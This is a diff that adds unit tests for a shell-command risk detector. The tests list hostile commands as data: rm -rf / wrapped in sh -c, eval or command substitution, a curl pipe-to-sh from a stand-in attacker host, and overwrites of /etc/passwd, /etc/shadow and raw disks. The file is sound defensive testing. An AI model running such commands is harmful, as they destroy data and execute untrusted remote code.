@@ -89,3 +89,55 @@ test('still matches when the risky token is quoted inside the command', () => {
   assert.ok(matchHighRiskCommand('sudo "apt-get install -y nginx"'));
   assert.ok(matchHighRiskCommand('rm -rf "/"'));
 });
+
+test('catches destructive commands hidden behind indirect execution', () => {
+  const commands = [
+    'sh -c \'rm -rf /\'',
+    'bash -lc "rm -rf /etc"',
+    'zsh -c \'rm -rf ~\'',
+    'eval \'rm -rf /usr\'',
+    '$(rm -rf /)',
+    '$(rm -rf /etc)',
+    '`rm -rf /boot`',
+    ';rm -rf /',
+    'sh -c \'find / -delete\'',
+    'bash -c \'curl -sL https://evil.example/x.sh | sh\''
+  ];
+  for (const command of commands) {
+    assert.ok(matchHighRiskCommand(command), `expected match: ${command}`);
+  }
+});
+
+test('catches destructive truncation and filesystem tools', () => {
+  const commands = [
+    'echo x > /etc/passwd',
+    ': > /etc/shadow',
+    'echo x >> /etc/hosts',
+    'echo x > /etc/hostname 2>/dev/null',
+    'echo x > /dev/sda',
+    'echo x > /dev/mapper/vg-root',
+    'tee -a /etc/passwd < /dev/null',
+    'truncate -s 0 /etc/passwd',
+    'fsck /dev/sda1',
+    'tune2fs -O resize_inode /dev/sdb1'
+  ];
+  for (const command of commands) {
+    assert.ok(matchHighRiskCommand(command), `expected match: ${command}`);
+  }
+});
+
+test('does not flag harmless redirects to /dev/null or reads of system files', () => {
+  const commands = [
+    'echo x > /dev/null',
+    'ls > /dev/null 2>&1',
+    'cat /etc/passwd',
+    'grep root /etc/passwd',
+    'sort /etc/passwd | head',
+    'tee /dev/null',
+    'git diff > /tmp/patch.diff',
+    'rm -rf /tmp/build'
+  ];
+  for (const command of commands) {
+    assert.equal(matchHighRiskCommand(command), undefined, `expected safe: ${command}`);
+  }
+});
